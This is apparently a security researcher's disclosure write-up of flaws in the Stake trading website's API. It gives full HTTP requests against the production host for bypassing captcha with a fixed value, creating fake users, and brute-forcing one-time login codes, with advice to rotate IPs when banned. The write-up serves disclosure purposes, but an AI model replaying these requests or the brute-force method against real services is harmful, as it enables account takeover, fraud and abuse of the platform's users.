# StakeOver
(2/9/2022) The [Stake](https://hellostake.com/) stock trading website is accessed through a mismanaged and insecure custom API. Manipulation of requests allow an attacker to:
1) Create any number of falsified users on the website
2) Tie all of these users to referal codes during "Sign Up"
3) Bypass Captcha Prompts
4) Bruteforce Two-Factor Authentication

After finding a number of vulnerabilities on the Stake website, without any intrusive exploitation, the security team decided to personally reach out on discord. A full audit of this site would likely introduce a number of much more serious issues as I did not perform any intrusive auditing. These issues have all been brought to the attention of the Stake security team and disclosed responsibly.

## Requests
Bypassing Captcha:
Simply append the `"captcha":"captchaIgnore"` option in any request body.

<p align="center">
  <img width="800" height="400" src="https://github.com/dragoneyeintel/StakeOver/raw/main/CreateUsersUnderEmailSkipCaptcha.gif">
</p>

Forging Users:
```
POST /api/users/createuser/ HTTP/2
Host: global-prd-api.hellostake.com
Content-Length: 355
Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99"
Accept: application/json
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
X-Server-Select: AUS
Sec-Ch-Ua-Platform: "Linux"
Origin: https://trading.hellostake.com/
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://trading.hellostake.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"marketingOptIn":true,"cvmAcceptance":null,"emailAddress":"noot@nootnoot.io",
"password":"Password12345$","captcha":"catpchaIgnore","username":"FakeUser","guestUserId":null,"regionIdentifier":"AUS","firstName":"noot","lastName":"LastName","marketingTitle":null,"campaign":null,"channel":null,"referringLink":null,"feature":null,"influencerClickId":null}
```

The user verification link will be sent to the email not the username although the website will prompt "Sending to username". This is not a problem however as 2FA can be bypassed.

<p align="center">
  <img width="800" height="400" src="https://github.com/dragoneyeintel/StakeOver/raw/main/Bypass2FA.gif">
</p>

Two-Factor Authentication Bruteforce:
```
POST /api/sessions/v2/createSession HTTP/2
Host: global-prd-api.hellostake.com
Content-Length: 122
Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99"
Accept: application/json
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
X-Server-Select: AUS
Sec-Ch-Ua-Platform: "Linux"
Origin: https://trading.hellostake.com/
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://trading.hellostake.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"username":"nootnootalakazam@protonmail.com","password":"Password123$","rememberMeDays":"30","platformType":"WEB_f5K2x3"}
```
Will send a one time password to the email associated with the username. 
```
POST /api/sessions/v2/createSession HTTP/2
Host: global-prd-api.hellostake.com
Content-Length: 122
Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99"
Accept: application/json
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
X-Server-Select: AUS
Sec-Ch-Ua-Platform: "Linux"
Origin: https://trading.hellostake.com/
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://trading.hellostake.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"username":"noot@nootnoot.io","password":"Password123$","rememberMeDays":"30","platformType":"WEB_f5K2x3","otp":"772335"}
```
Will attempt to verify the OTP. Inctiment the OTP from 000000-999999 until one works. Every 10,000 requests (aprox) the IP is banned and should be changed. When a request status 200 is identified, the user has logged in suessfully.

[@nootsploit](https://twitter.com/nootsploit)

https://dragoneyeintel.com
